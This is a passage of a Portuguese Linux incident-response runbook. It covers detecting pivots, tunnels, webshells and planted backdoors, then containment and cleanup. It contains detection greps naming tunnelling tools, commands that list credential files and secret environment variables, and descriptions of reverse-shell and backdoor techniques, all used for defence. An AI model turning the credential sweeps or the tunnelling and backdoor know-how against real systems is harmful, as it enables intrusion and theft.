```bash
sudo ss -tnp state established 2>/dev/null | grep -v '^Recv-Q' | awk '
  { peer=$4; pid="?"
    if (match($0,/pid=[0-9]+/)) pid=substr($0,RSTART+4,RLENGTH-4)
    priv = (peer ~ /^(10\.|127\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/)
    if (priv) intr[pid]++; else ext[pid]++ }
  END { for (p in ext) if (p in intr)
          printf "PIVÔ? pid=%s externo=%d interno=%d\n", p, ext[p], intr[p] }'
```

```bash
# achou um candidato? identifique-o pela §3 (o nome no 'ps' pode ser forjado)
sudo readlink -f /proc/<PID>/exe; sudo ls -la /proc/<PID>/fd | grep socket | wc -l
```

> Processo legítimo raramente mantém, no mesmo instante, conexão para IP público **e** para a rede interna. As exceções são conhecidas e você as reconhece pelo nome: proxy reverso, agente de monitoração/log, runtime de container. Qualquer outra coisa nessa lista é o relay — inclusive um binário com nome camuflado, porque a consulta não olha o nome.

### Dois mecanismos, dois lugares de olhar

```text
relay em USERSPACE       gs-netcat, chisel, socat, ligolo, ssh -L/-R/-D
                         dois sockets no MESMO processo   → a consulta acima
encaminhamento no KERNEL ip_forward + NAT, tun/tap, VPN
                         o pacote passa SEM socket        → nenhuma consulta de socket enxerga
```

```bash
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding    # 1 num host que não é roteador = bandeira
sudo iptables -t nat -S; sudo nft list table nat 2>/dev/null   # DNAT/MASQUERADE que você não criou
sudo iptables -L FORWARD -n -v                              # 'pkts' subindo = tráfego passando AGORA
ip -br link; ip tuntap show 2>/dev/null                     # tun0/tap0/wg0 que ninguém criou
IP=$(hostname -I | awk '{print $1}')
sudo conntrack -L 2>/dev/null | grep -v "src=$IP" | grep -v "dst=$IP" | head   # este host é só o caminho
```

### O ponto cego: relay não abre porta

```bash
sudo ss -ltnp | grep -vE '127\.0\.0\.1|::1'      # listener inesperado: pega o túnel que ESPERA conexão
```

> **É por isso que procurar listener não basta.** Essa busca só encontra tunelamento que fica aguardando conexão de entrada. Ferramenta baseada em relay — GSocket é o exemplo (§5.10) — **sai** para a rede de relay e recebe a ordem por ali. Deste host, tudo é conexão de **saída** e não existe listener nenhum. Quem procurou só porta aberta concluiu "sem túnel" com o pivô ativo na frente.

### Por nome (ainda vale, é barato)

```bash
# túneis SSH: -L (local), -R (reverse), -D (SOCKS), -w (vpn)
sudo ps -eo pid,user,args | grep -E 'ssh.* -[LRDW]' | grep -v grep
# ferramentas comuns de túnel/proxy usadas em pivô
sudo ps -eo pid,user,args \
  | grep -E 'socat|chisel|ngrok|frpc?|gost|iodine|sshuttle|3proxy|proxychains|ligolo|gs-netcat' \
  | grep -v grep
```

> Pega o operador preguiçoso, e custa um segundo. Não conclua nada de um resultado vazio: `exec -a` renomeia o processo no exec (§7.1) e o binário pode ser estático e sem nome reconhecível (§5).

### O lado interno: para onde ele foi

Confirmado o pivô, o alcance dele é a §12.4 — leque de `SYN-SENT` para portas de serviço interno, `conntrack` para IP RFC1918, e crescimento da tabela ARP. E o inverso, se este host atacou outras VMs, está na §12.6.

> **De fora é mais fácil:** VPC Flow Logs mostram este host conversando com N endereços internos com que nunca conversou antes. Um servidor de aplicação que passa a falar com 40 IPs da VPC não precisa de mais nenhuma prova (§10.4, §37.6).

### Mitigar

**O princípio:** um pivô só existe se este host conseguir **falar com o operador** e **alcançar algo que valha a pena**. Corte qualquer um dos dois e o implante continua vivo — e inútil. Matar o processo (§20) não é mitigação: ele volta pela §7.

Agora, em **um bloco** (§18 — os dois lados de uma vez, senão você só avisa o atacante):

```bash
# 1) o canal com o operador: sem lista de saída permitida não há relay (§18.1 não basta — o C2 não tem IP fixo)
sudo iptables -I OUTPUT 1 -m owner --uid-owner <USER> ! -d <DESTINO_APROVADO> -j REJECT
# 2) o alcance interno: mesmo com o canal cortado, ele pode ter outro
sudo iptables -I OUTPUT 1 -m owner --uid-owner <USER> \
  -d 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 -j REJECT
# 3) e no firewall da VPC — o do host cai junto com o host
```

Se o encaminhamento for de **kernel** (§ acima), o corte é outro:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
sudo iptables -P FORWARD DROP
sudo ip link del tun0 2>/dev/null            # a interface criada pelo túnel
```

> ⚠️ Não faça `iptables -t nat -F` às cegas: isso derruba a rede de containers (Docker/k8s) do host inteiro. Remova a regra específica que você não reconhece, com `-D`.

Depois do corte, duas consequências automáticas: os alvos que ele alcançou passam a ser **suspeitos** (§23 — varra a frota com os IOCs) e a credencial que permitiu o salto está **queimada** (§26 — rotacione, mesmo sem prova de uso).

**Estruturalmente — o que impede o próximo:**

```text
egress default-deny             §34.3  sem destino permitido, não existe relay possível
segmentação leste-oeste         §34.5  o pivô só vale se o vizinho estiver alcançável
IPAddressDeny=any + Allow=      §34.1  egress no cgroup do serviço: vale mesmo se o processo virar root
RestrictAddressFamilies=        §34.1  sem AF_PACKET/AF_NETLINK: sem socket cru, sem mexer em rota
CapabilityBoundingSet=          §34.1  sem CAP_NET_ADMIN/CAP_NET_RAW: não cria tun nem altera roteamento
PrivateNetwork=yes              §34.1  para serviço que não precisa de rede — o corte total
bastion + sem ForwardAgent      §34.5  tira o pivô de SSH pronto (§12.1)
identidade por serviço          §34.4  a credencial daqui não abre o vizinho, então o salto não paga
alerta de conexão interna nova  §34.7  app falando com porta interna que nunca usou = alarme
```

> **A que resolve sozinha é a primeira.** Todo o resto reduz o alcance; o egress default-deny remove a premissa — sem canal de saída aprovado, o relay não estabelece, e a §2.7 vira um contador subindo em vez de um pivô funcionando.

## 12.3. Credenciais/artefatos que habilitam pivô

O que este usuário conseguia ler pode ter sido usado para se mover:

```bash
sudo find /home /root -maxdepth 3 2>/dev/null \( \
  -name '.netrc' -o -name '.pgpass' -o -name '.git-credentials' \
  -o -path '*/.aws/credentials' -o -path '*/.kube/config' \
  -o -path '*/.docker/config.json' -o -name '*.pem' -o -name '*.ppk' \) -print
ls -la /tmp/krb5cc_* 2>/dev/null                 # tickets kerberos
env | grep -iE 'TOKEN|KEY|SECRET|PASS' 2>/dev/null
```

Credenciais de cloud (metadata/instância) → pivô no projeto: ver §10.5.

## 12.4. Mapa de rede interna (para onde deu para ir)

```bash
ip neigh                    # ARP: hosts com quem falou recentemente
ip route                    # sub-redes alcançáveis
sudo conntrack -L 2>/dev/null | grep -vE '127\.0\.0\.1'   # conexões internas
# sinais de varredura interna (muitos SYN de saída para :22/:445/:3306):
sudo ss -tan | awk '$1=="SYN-SENT"{print $5}' | sed 's/:[0-9]*$//' | sort | uniq -c | sort -rn | head
```

## 12.5. Este host foi ALVO de lateral? (pivô de entrada)

```bash
# logins SSH de entrada vindos de IPs INTERNOS (RHEL: secure; Debian: auth.log)
sudo zgrep -aE 'Accepted (password|publickey)' /var/log/secure* /var/log/auth.log* 2>/dev/null \
  | grep -E '10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.' | tail -40
# o serviço vulnerável era alcançável só internamente? (então veio de dentro)
```

> Lógica: se o backdoor roda como um usuário de app e a entrada foi por um serviço exposto (§14/§16), provavelmente **não** houve lateral de entrada — foi exploração direta. Confirme cruzando IP de origem (interno vs externo) com a data do incidente.

## 12.6. Movimentação lateral por serviço vulnerável (não-SSH)

Nem toda lateral é por SSH. Um atacante em outro host interno pode explorar uma **porta de serviço** exposta na VPC (backend de app, DB, painel admin) batendo **direto na porta** — contornando qualquer proxy/WAF que só existe na borda. Bater direto no backend = mesmo efeito que `localhost` (sem a normalização do proxy).

> **Por quê:** confirmar se a entrada veio de uma VM/host interno (lateral) em vez de fora. **Olhe para:** conexões na porta vulnerável vindas de **IP interno da VPC**, e o firewall interno que libera essa porta entre hosts.

### Quem alcança a porta vulnerável (superfície interna)

```bash
# a porta escuta em todas as interfaces? (0.0.0.0/:: = alcançável por outros hosts, não só localhost)
sudo ss -ltnp | grep ':<PORTA>'
# firewall da cloud: a porta é liberada DENTRO da VPC?
gcloud compute firewall-rules list --filter="allowed.ports:<PORTA>" \
  --format='table(name,sourceRanges.list(),allowed[].ports)'        # GCP
# AWS: aws ec2 describe-security-groups --filters Name=ip-permission.to-port,Values=<PORTA>
```

### A app foi acessada por origem interna?

```bash
# conexões na porta vindas de IP RFC1918 (interno)
sudo ss -tnp | grep ':<PORTA>' | grep -E '10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.'
sudo conntrack -L 2>/dev/null | grep '<PORTA>'
# logs do serviço/proxy: IP de origem interno na janela do incidente
# VPC Flow Logs (cloud): conexões de OUTRAS VMs -> :<PORTA> em torno do incidente
```

### O inverso: este host atacou serviços de OUTRAS VMs?

```bash
# varredura/exploração de saída para serviços internos (comportamento worm-like)
sudo ss -tan | awk '$1=="SYN-SENT"{print $5}' | sed 's/:[0-9]*$//' | sort | uniq -c | sort -rn | head
sudo conntrack -L 2>/dev/null | grep -vE '127\.0\.0\.1' | head
```

> **Distinção final:** IP de origem **externo** (no log do proxy/borda) = entrada externa; IP de origem **interno** direto na porta (conntrack/VPC Flow) = **lateral de entrada** a partir de outra VM. Um proxy/WAF na borda **não protege** a porta se ela for alcançável direto dentro da rede — feche a porta no firewall interno e faça bind em `127.0.0.1` quando possível.

---

# 13. Bash history

> **Por quê:** às vezes o atacante deixa os comandos que rodou. **Olhe para:** `curl|bash`, `base64 -d`, edição de cron, `chmod +x`, download de binário. E cheque anti-forense: history apontando para `/dev/null` ou zerado. **Ausência de comandos ≠ ausência de ataque** — RCE não passa por shell interativo.

```bash
sudo cat /home/<USER>/.bash_history
```

Filtrar:

```bash
sudo grep -niE \
'curl|wget|base64|cron|chmod|bash|sh|tmp|ssh|scp' \
/home/<USER>/.bash_history
```

Cheque anti-forense comum (history desviado para o nada):

```bash
ls -la /home/<USER>/.bash_history   # symlink para /dev/null ou tamanho 0 = suspeito
```

Não trate ausência de comandos no history como evidência de ausência de ataque.

RCE normalmente não passa por shell interativo.

---

# 14. Identificar serviço vulnerável

> **Por quê:** ligar a porta/serviço exposto ao processo e ao usuário — é o vetor de entrada. **Olhe para:** qual aplicação escuta a porta atacada, sob qual usuário; cruze com o usuário do backdoor (a heurística abaixo estreita o vetor).

Liste listeners:

```bash
sudo ss -ltnp
```

Exemplo:

```text
*:4025 users:(("node",pid=3173,...))
```

Pegue o PID:

```bash
PID=3173
```

Descubra aplicação:

```bash
sudo readlink -f /proc/$PID/exe
sudo readlink -f /proc/$PID/cwd
sudo sh -c "tr '\0' ' ' < /proc/$PID/cmdline"
```

## Heurística: usuário do malware → estreita o vetor

O backdoor rodou como um usuário específico. **Só serviços que rodam como ESSE usuário podem ser o vetor** — o resto provavelmente não é a entrada (e ajuda a descartar "movimentação lateral").

```bash
USER_MAL=$(sudo stat -c %U /proc/$PID/exe 2>/dev/null || echo '<user>')
# quais serviços/portas rodam com esse usuário?
ps -u "$USER_MAL" -o pid,comm,args
sudo ss -ltnp | grep "\"$USER_MAL\"" 2>/dev/null || sudo ss -ltnp   # cruze usuário x listener
```

Exemplo: backdoor roda como `app-user`; o servidor web PHP roda como `www-data`. Um RCE no PHP daria `www-data`, não `app-user` → **PHP não é o vetor**; olhe os serviços que rodam como `app-user`.

---

# 15. Reverse proxy

> **Por quê:** mapear o caminho Internet → app e onde o payload realmente passa. **Olhe para:** rotas/`proxy_pass` para o serviço atacado, se o proxy **não** filtra o corpo, e se o backend está exposto direto (bypass do proxy).

## nginx

Config completa:

```bash
sudo nginx -T
```

Filtrar:

```bash
sudo nginx -T 2>/dev/null \
  | grep -nE \
  'server_name|listen|location|proxy_pass|fastcgi_pass'
```

---

## Apache

```bash
sudo apachectl -S
```

```bash
sudo grep -RInE \
'ProxyPass|ProxyPassReverse|RewriteRule.*http' \
/etc/httpd \
/etc/apache2 \
2>/dev/null
```

Objetivo:

```text
Internet
↓
LB / proxy
↓
nginx/apache
↓
porta interna
↓
aplicação
```

## Duas armadilhas do proxy (não confie nele como proteção)

1. **O proxy repassa o CORPO da requisição.** Ele pode normalizar/bloquear a URL, mas o payload no body (JSON/form) chega intacto à app. Filtro de WAF/regra na URL **não** protege sinks alimentados pelo corpo (SSRF, deserialização, template injection).

2. **A porta interna pode estar exposta direto** — o atacante pula o proxy:

```bash
# a porta do backend responde SEM passar pelo proxy?
sudo ss -ltnp | grep -vE '127\.0\.0\.1|::1'      # backend em 0.0.0.0/:: = alcançável direto
curl -s -m5 http://<IP_PUBLICO>:<PORTA_BACKEND>/  # de fora: se responder, o proxy é bypassável
```

Correção: bind do backend em `127.0.0.1`, firewall na porta interna, e proteção na camada que a app realmente lê (não só na URL do proxy).

---

# 16. Camada de aplicação (agnóstico de linguagem)

> **Por quê:** o binário e a persistência são o *efeito*; aqui está a **causa** — a linha de código que deixou entrada externa virar execução. Sem fechá-la, tudo se repete. **Olhe para:** um `sink` perigoso alimentado por dado que veio da requisição.

**O modelo mental (source → sink):** vulnerabilidade = dado controlado pelo atacante (*source*: URL, header, body, upload, nome de arquivo) chegando a uma função poderosa (*sink*: executa comando, resolve URL, escreve arquivo, desserializa) sem validação no meio. Os `grep` abaixo acham os **sinks** — poucos e nomeáveis em qualquer linguagem. Achado o sink, siga o dado para trás até a rota HTTP: se o caminho existe, é o vetor.

Achar o serviço vulnerável e o "sink" que virou RCE — sem assumir a stack (PHP, Python, Node, Ruby, Go, Java, shell). Ajuste os diretórios de código:

```bash
APP='/srv /opt /var/www /data /home'
EXC='node_modules|vendor|/\.git/|site-packages'
```

## Integridade do código (rápido e preciso)

Apps versionadas em git delatam adulteração na hora:

```bash
for b in /srv /opt /var/www /data /home; do
  find "$b" -maxdepth 5 -name .git -type d 2>/dev/null | while read g; do
    r=$(dirname "$g")
    git -C "$r" status --short 2>/dev/null | grep -q . && { echo "== ALTERADO: $r =="; git -C "$r" diff --stat 2>/dev/null; }
  done
done
```

### Os três pontos cegos do `git status`

Um `status` limpo **não** significa código íntegro. Ele só enxerga alteração não commitada:

```bash
R=/srv/app
git -C "$R" status --ignored --short | grep '^!!'      # arquivo que o .gitignore ESCONDE do status
git -C "$R" log --all --since="$START" --until="$END" --stat    # ele commitou?
git -C "$R" fetch -q 2>/dev/null; git -C "$R" diff origin/<BRANCH> --stat   # divergência do remoto
git -C "$R" reflog --date=iso | head -30               # quando o ref REALMENTE se moveu (data local)
git -C "$R" fsck --lost-found 2>/dev/null | grep commit | head   # commit órfão = o que foi 'amend'-ado
git -C "$R" log --show-signature -5 2>/dev/null        # se vocês assinam, é o padrão-ouro
git -C "$R" status --short -- vendor/ node_modules/    # o que o $EXC esconde o resto do tempo
```

```text
1. commitou       o status fica limpo. E as datas mentem: GIT_AUTHOR_DATE e GIT_COMMITTER_DATE
                  são variáveis de ambiente — o commit "de 3 meses atrás" pode ser de ontem
2. fez 'amend'    o histórico parece intacto porque foi reescrito. O commit original costuma
                  sobreviver como objeto órfão até o gc: 'fsck --lost-found' o traz de volta
3. usou .gitignore  arquivo dropado num caminho ignorado nunca aparece no 'status' — só com --ignored
```

> **O que não mente:** o **reflog** registra o movimento local do ref com a hora real da máquina, e o **remoto** é uma cópia que o atacante do host normalmente não controla — `git diff origin/<BRANCH>` é a comparação autoritativa. Com uma ressalva: se ele pegou a *deploy key* ou o token de CI (§27), o remoto também está queimado, e aí a única âncora é o artefato de build.

### Código não versionado

Deploy por `rsync`, tarball ou FTP não deixa base de comparação. Três substitutos, do mais barato ao mais confiável:

```bash
# 1) histograma de mtime: um deploy escreve TUDO junto — o arquivo tocado depois é outlier
find "$R" -type f -printf '%TY-%Tm-%Td\n' | sort | uniq -c | sort -rn | head
# ...e o outlier em si
find "$R" -type f -newermt "$D" -printf '%TY-%Tm-%Td %TT %p\n' 2>/dev/null | sort

# 2) ctime fora da janela de deploy — não é falsificável (§5.2), então é melhor que o mtime
find "$R" -type f -newerct "$START" -printf '%CY-%Cm-%Cd %CT %p\n' 2>/dev/null | sort

# 3) diff contra o artefato de build ou contra um host-espelho da mesma versão
diff -rq "$R" /mnt/artefato-do-build 2>/dev/null | head -40
```

> **O histograma é o truque que rende mais.** Um deploy é um evento único: milhares de arquivos com o mesmo dia de `mtime`. Um arquivo com data diferente do bloco é anomalia sem precisar de baseline nenhuma — mesma lógica do "volume de log por dia" da §9.1. E o §24 (pacotes) não ajuda aqui: código de app não vem de pacote.

## Execução de comando (sinks de RCE, multi-linguagem)

```bash
sudo grep -RInaE \
  'system\(|popen\(|shell_exec|proc_open|passthru|exec[lvpe]*\(|child_process|spawn|subprocess|os\.system|Runtime\.getRuntime|ProcessBuilder|eval\(|assert\(|unserialize\(|pickle\.loads|Marshal\.load|yaml\.load\(' \
  $APP 2>/dev/null | grep -vE "$EXC"
```

## Invocação de shell

```bash
sudo grep -RInaE '/bin/bash|/bin/sh|bash -c|sh -c|exec -a' $APP 2>/dev/null | grep -vE "$EXC"
```

## Requisições externas / SSRF (o servidor busca URL do cliente)

```bash
sudo grep -RInaE 'curl|wget|file_get_contents|fopen|http\.get|https\.get|fetch\(|requests\.get|urlopen|HttpClient|WebClient' $APP 2>/dev/null | grep -vE "$EXC"
```

## Escrita de arquivo controlada (path traversal → drop/overwrite)

```bash
sudo grep -RInaE 'file_put_contents|fwrite|writeFile|createWriteStream|move_uploaded_file|shutil\.copy|os\.rename|copyFile' $APP 2>/dev/null | grep -vE "$EXC"
```

## Upload

```bash
sudo grep -RInaE 'multipart|form-data|move_uploaded_file|\$_FILES|multer|MultipartFile|FileUpload' $APP 2>/dev/null | grep -vE "$EXC"
```

## Componentes desatualizados (EOL/CVE) — manifests de qualquer stack

```bash
sudo find $APP -maxdepth 4 \( -name package.json -o -name composer.json \
  -o -name requirements.txt -o -name go.mod -o -name pom.xml -o -name Gemfile \) 2>/dev/null
```

## Webshell no docroot

Arquivos plantados na raiz web que executam comando (backdoor clássico). Ajuste `WEBROOT`:

```bash
WEBROOT='/var/www /srv/www /usr/share/nginx /opt/*/public'
# recém-criados na janela do incidente:
sudo find $WEBROOT -type f -newermt "$D" 2>/dev/null
# padrões de webshell (agnóstico):
sudo grep -RIlnaE \
  'eval\(|assert\(|system\(|shell_exec|passthru|base64_decode\(.*\)|popen\(|proc_open|`.*\$_(GET|POST|REQUEST)|FromBase64String|Runtime\.exec' \
  $WEBROOT 2>/dev/null
```

## Backdoor no código legítimo (não é webshell)

Webshell é **arquivo novo** no docroot — a busca acima acha. Backdoor plantado é **linha inserida no código que já existia**: não muda a lista de arquivos, não parece estranho num `ls`, e sobrevive a qualquer limpeza que se guie por "arquivos recentes".

O que procurar no diff (ou nos arquivos que a integridade acima marcou):

```text
condição que depende de header/param não documentado   ?dbg=, ?cmd=, X-Debug, cookie mágico
credencial, hash ou token literal no código            senha embutida = porta fixa
retorno antecipado dentro da função de autenticação    'return true' antes da validação
rota/endpoint novo sem o middleware que os outros têm  painel administrativo sem auth
chave de assinatura fixa, ou JWT com algoritmo frouxo  alg:none, verify=false
sink de execução/desserialização introduzido no diff   os greps de RCE acima
exceção "temporária" para um IP, usuário ou tenant     o bypass que ninguém removeu
```

```bash
# entrada do cliente virando condição de desvio
sudo grep -RInaE '\$_(GET|POST|REQUEST|COOKIE|SERVER)\[[^]]+\][[:space:]]*===?|req\.(query|headers|body)\[[^]]+\][[:space:]]*===?|request\.(args|headers)\.get' \
  $APP 2>/dev/null | grep -vE "$EXC"
# segredo literal
sudo grep -RInaE '(password|passwd|secret|token|api_?key)[[:space:]]*[:=][[:space:]]*["'\''][^"'\'']{6,}' \
  $APP 2>/dev/null | grep -vE "$EXC"
# verificação de token desligada
sudo grep -RInaE 'alg[^a-z]*none|verify[[:space:]]*[:=][[:space:]]*(false|False)|algorithms[[:space:]]*[:=].*none' \
  $APP 2>/dev/null | grep -vE "$EXC"
# rotas declaradas — compare quem tem middleware de auth e quem não tem
sudo grep -RInaE '(app|router)\.(get|post|all|use)\(|@(app|bp)\.route\(|Route::(any|get|post)\(' \
  $APP 2>/dev/null | grep -vE "$EXC"
```

Adulteração de dependência (o backdoor que entra no `install`):

```bash
grep -n -A4 '"scripts"' $APP/package.json 2>/dev/null | grep -iE 'preinstall|postinstall|prepare'
sudo find $APP -maxdepth 4 -newerct "$START" \( -name 'package*.json' -o -name 'requirements.txt' \
  -o -name 'composer.*' -o -name 'go.mod' -o -name 'Gemfile*' \) -ls 2>/dev/null
```

> **O ponto cego do próprio `$EXC`:** todos os greps desta seção excluem `node_modules`, `vendor` e `site-packages` — que é exatamente onde uma dependência adulterada se esconde. Quando a suspeita for de supply chain, rode **sem** o filtro, ou compare o diretório com uma reinstalação limpa a partir do lockfile.

> **Como distinguir de bug:** um bug de autenticação é assimétrico e desajeitado; um backdoor é **conveniente** — só dispara com um valor que só o autor conhece, e não afeta nenhum fluxo legítimo. Se a condição depende de um segredo e o código funciona perfeitamente sem ela, não é descuido.

---

> A porta que a app escuta (§14) + o sink encontrado aqui = o vetor. Correlacione com o `ctime` do artefato dropado (§9) e o processo pai do `EXECVE` no audit (§11).

---

# 17. Indicadores fortes de reverse shell/backdoor

> **Por quê:** cada sinal isolado tem explicação inocente; a **combinação** não tem. **Olhe para:** a conjunção abaixo — é a assinatura estrutural de shell remoto, independente de família de malware.

**Backdoor não é uma coisa só.** É qualquer coisa que devolva acesso ao atacante **sem re-explorar** — e ela pode morar em cinco camadas. Esta seção cobre a primeira; conferir só ela e concluir "não há backdoor" é o erro mais comum:

```text
1. processo/rede    implante rodando, canal para o operador        §17 (aqui) §2.7 §12.2
2. sistema          o gatilho que o relança sozinho                §7 (as 12 subseções)
3. autenticação     chave, usuário UID 0, PAM, AuthorizedKeysCommand  §7.5 §7.9 §7.12
4. binário          executável de sistema trojanizado              §24 §5
5. aplicação        webshell no docroot, ou linha plantada no código  §16
```

> Um operador competente deixa mais de uma, em camadas diferentes de propósito (§7, §23). A da camada 1 é a que faz barulho e existe para ser achada.

---

**A lógica:** um shell reverso precisa, por construção, de (1) um canal de saída para o operador, (2) um interpretador para executar o que chega e (3) um TTY para o operador digitar confortavelmente. Você não está reconhecendo um malware específico — está reconhecendo o **formato** de qualquer um deles. É por isso que esse checklist envelhece bem.

Combinação especialmente suspeita:

```text
processo desconhecido
+
socket outbound para IP público
+
child bash/sh
+
PTY (/dev/ptmx)
```

Exemplo:

```text
systemd
└─defunct
   └─defunct
      └─bash
```

e:

```text
/home/node/.config/htop/defunct
→ IP_PUBLICO:443
→ /dev/ptmx
```

Trate como comprometimento confirmado até prova em contrário.

> **Por que "reverse" e não bind shell:** firewall e NAT bloqueiam conexão de *entrada*, mas quase todo host pode **sair** para a internet — em especial na 443, que ninguém bloqueia e onde o tráfego se mistura ao HTTPS legítimo. Daí a regra prática: a defesa que realmente dói para o atacante é **egress default-deny** (§18.1), não mais uma regra de INPUT.

> Consequência para a caça: procure pela conexão **de saída** iniciada pelo host, não por porta aberta esperando. E lembre que o *beacon* pode ser periódico — um C2 que fala de 10 em 10 minutos não aparece num `ss` tirado no minuto errado. O método para esse caso é a §2.7.

---

# 18. Contenção

> **Por quê:** cortar o acesso do atacante — mas só depois de coletar o mínimo (senão você destrói evidência). **Olhe para:** ordem — bloquear C2, isolar a porta/serviço vulnerável, e lembrar que C2 por relay não para bloqueando 1 IP (use egress).

Depois de coletar o mínimo necessário:

```text
processo
rede
exe
ctime
hash
persistência
```

contenha.

---

## 18.1. Bloquear C2

### iptables

```bash
sudo iptables \
-I OUTPUT 1 \
-d <IOC_IP> \
-j DROP
```

Confirmar:

```bash
sudo iptables \
-L OUTPUT \
-n -v \
--line-numbers
```

Idealmente bloqueie também no firewall da cloud/rede.

> **C2 por relay não para bloqueando 1 IP.** Backdoors como GSocket/gs-netcat, Tor ou domain-fronting saem por uma rede de relays sem IP fixo. Nesses casos, prefira **egress default-deny** (libere só o necessário) e bloqueie o metadata:

```bash
sudo iptables -A OUTPUT -m owner --uid-owner <USER> -d 169.254.169.254 -j REJECT
sudo iptables -A OUTPUT -m owner --uid-owner <USER> \
  -d 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 -j REJECT
# e, se possível, DROP de saída do usuário da app exceto destinos aprovados
```

---

## 18.2. Desabilitar serviço vulnerável

Systemd:

```bash
sudo systemctl stop <SERVICE>
sudo systemctl disable <SERVICE>
```

PM2:

```bash
sudo -iu <USER> pm2 stop <APP>
```

Nginx/backend:

* retire rota;
* remova backend do load balancer;
* restrinja firewall;
* coloque autenticação emergencial, se necessário.

---

# 19. Remover persistência

> **Por quê:** a ordem é o que faz a limpeza funcionar. **Olhe para:** remover gatilho → matar processo → apagar binário. Invertido, o supervisor relança o malware antes de você chegar no `rm` — e você entrega que foi detectado.

Faça isso **antes de matar o malware**, para evitar relaunch.

```text
1. coletar/preservar   §6    depois não tem volta
2. remover gatilhos    §19   cron, unit, supervisor, chave
3. matar processo      §20   árvore inteira, de uma vez
4. remover binário     §21   já com hash e cópia guardados
5. validar             §22   e re-scan em 24-48h
```

> Registre **cada** remoção (o quê, onde, hora, conteúdo original). Um cron apagado sem cópia é evidência perdida — e se o serviço quebrar depois, você não sabe se era legítimo.

---

## Cron

```bash
sudo crontab -u <USER> -l
```

Editar:

```bash
sudo crontab -u <USER> -e
```

---

## Systemd

```bash
sudo systemctl disable --now <UNIT>
```

Depois:

```bash
sudo rm -f /etc/systemd/system/<UNIT>
sudo systemctl daemon-reload
```

Somente se a unit foi confirmada como maliciosa.

---

## SSH

Remova somente chave confirmada como maliciosa de:

```text
~/.ssh/authorized_keys
```

---

# 20. Matar processo

> **Por quê:** derrubar o malware — mas só **depois** de coletar (§6) e remover a persistência (§19), senão o supervisor/cron o relança. **Olhe para:** matar a árvore inteira (pai + filhos) e confirmar que não reapareceu.

Primeiro:

```bash
sudo kill -TERM <PID>
```

Aguarde:

```bash
sleep 2
```

Verifique:

```bash
ps -p <PID>
```

Se continuar:

```bash
sudo kill -KILL <PID>
```

> **TERM x KILL:** `SIGTERM` (15) é capturável — o processo pode ignorar, limpar rastro, avisar o C2 ou reexecutar-se em outro lugar. `SIGKILL` (9) é entregue pelo kernel e não passa pelo programa. Em incidente, se há suspeita de handler, vá **direto de KILL**; o TERM educado só faz sentido em serviço legítimo que você quer parar limpo.

> **Se o KILL não mata**, o processo está em estado `D` (I/O ininterrupto — travado em rede/NFS) ou é thread de kernel. Nesses casos, corte a fonte: bloqueie o C2 (§18.1) ou desconecte a interface; o processo sai do `D` e morre.

---

## Parent + child

Liste a árvore:

```bash
sudo pstree -aps <PID>
```

Mate os PIDs confirmados:

```bash
sudo kill -TERM <PID1> <PID2> <PID3>
sleep 2
```

> **Mate a árvore num único comando.** Só o filho: o pai o recria. Só o pai: o filho é **reparentado para o PID 1** e continua rodando — agora sem o pai que te levaria até ele. Um comando com todos os PIDs elimina a janela em que um recria o outro.

Se necessário:

```bash
sudo kill -KILL <PID1> <PID2> <PID3>
```

---

# 21. Remover/quarentenar arquivo

> **Por quê:** eliminar o binário — só depois de hash + cópia + persistência removida + processo morto. **Olhe para:** confirmar que a cópia preservada (§6) existe antes do `rm`.

Depois de:

```text
hash
stat
cópia
persistência removida
processo morto
```

Remova:

```bash
sudo rm -f <FILE>
```

Se o `rm` falhar **mesmo como root**, o arquivo está imutável (`chattr +i`) — truque comum para travar `authorized_keys`, cron e o próprio binário:

```bash
sudo lsattr "$FILE"                       # a letra 'i' no atributo = imutável ('a' = append-only)
sudo chattr -i "$FILE" && sudo rm -f "$FILE"
# onde mais ele travou algo?
sudo lsattr -R /etc /root /home 2>/dev/null | awk '$1 ~ /[ia]/ {print}'
```

> **É achado, não só obstáculo.** Ninguém aplica `+i` por acaso: um `authorized_keys` imutável é persistência deliberada, e `+a` (append-only) num log é anti-forense — impede a limpeza *e* denuncia quem mexeu. Registre antes de remover o atributo (§19).

---

# 22. Validar depois da limpeza

> **Por quê:** confirmar que a limpeza pegou tudo. **Olhe para:** sem a conexão de C2, sem o listener, sem o processo, sem o arquivo, e nada em "deletado-em-execução". Se algo persiste, você não removeu toda a persistência.

Conexões:

```bash
sudo ss -tnp state established
```

Listeners:

```bash
sudo ss -ltnp
```

Processos:

```bash
sudo pgrep -af '<IOC>'
```

Arquivo:

```bash
sudo find /home /tmp /var/tmp /dev/shm \
-name '<IOC>' \
-print \
2>/dev/null
```

Executável deletado:

```bash
sudo lsof +L1
```

Rede:

```bash
sudo lsof -Pan -i
```

> **Re-scan em 24–48h.** Atacante costuma voltar (persistência que você não achou, ou re-exploração do vetor se ele não foi fechado). Repita §2 (rede), §3.14 (deletados), §8 (ELF em home/tmp) e confira se o listener/C2 reapareceu. Se voltou, ainda há persistência ou o vetor segue aberto (§18).

---

# 23. Procurar segunda persistência

> **Por quê:** quem investe em invadir investe em voltar. A primeira persistência costuma ser a descartável — ela existe para ser achada. **Olhe para:** os mesmos IOCs em lugares que você ainda não olhou, e nos **outros hosts**.

Vire a busca do avesso: em vez de procurar "malware", procure **o seu IOC** (hash, nome, IP, chave, usuário) em todo lugar onde ele possa ter sido referenciado.

```bash
sudo grep -RInaE \
'<IOC>|exec -a|base64|curl|wget|/tmp|/dev/shm' \
/home \
/etc \
/var/spool/cron \
/tmp \
/var/tmp \
/dev/shm \
/data \
2>/dev/null
```

## Varredura da frota (mesmo IOC em outros hosts)

Um comprometimento raramente é de 1 host só. Com os IOCs deste host (hash do binário, nome do arquivo, IP/domínio de C2, chave SSH plantada, usuário criado), **varra os demais servidores** — o atacante pode ter movido lateralmente (§12) ou atingido vários pela mesma exposição.

```bash
# rode nos outros hosts (ssh/ansible/parallel):
sha256sum <ARQUIVO_IOC> 2>/dev/null                      # mesmo binário?
sudo find / -xdev -name '<NOME_IOC>' 2>/dev/null          # mesmo nome/artefato
sudo grep -RIna '<CHAVE_SSH_ATACANTE>' /home /root 2>/dev/null   # mesma chave plantada
